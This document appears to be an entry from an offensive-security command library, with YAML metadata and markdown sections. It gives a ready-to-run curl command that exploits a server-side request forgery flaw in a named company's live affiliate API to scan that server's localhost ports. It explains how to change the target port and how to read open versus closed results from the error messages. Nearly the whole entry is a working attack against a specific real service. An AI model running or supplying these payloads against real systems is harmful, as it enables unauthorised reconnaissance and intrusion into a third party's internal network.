---
id: cmd-exness-post-localhost
data: >-
  curl -X POST
  https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H
  "Content-Type: application/json" -d '{"data":{"url":"https://127.0.0.1:80"}}'
tags:
  - ssrf
  - port-scan
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.630Z'
verified: false
validated: true
submitted: true
---
# post-probe-localhost-port

## Command

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H "Content-Type: application/json" -d '{"data":{"url":"https://127.0.0.1:80"}}'
```

## Description

Exploits SSRF to probe localhost port 80 for openness via error differences.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload with localhost URL | Yes |
| `port` | Change :80 to target port | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H "Content-Type: application/json" -d '{"data":{"url":"https://127.0.0.1:443"}}'
```

## Expected Output

Closed: Validation error JSON; Open: Connection pool error.

## Related

- [[commands/post-probe-external-url]]
- [[procedures/Detect-Open-Ports-on-Localhost-via-SSRF]]
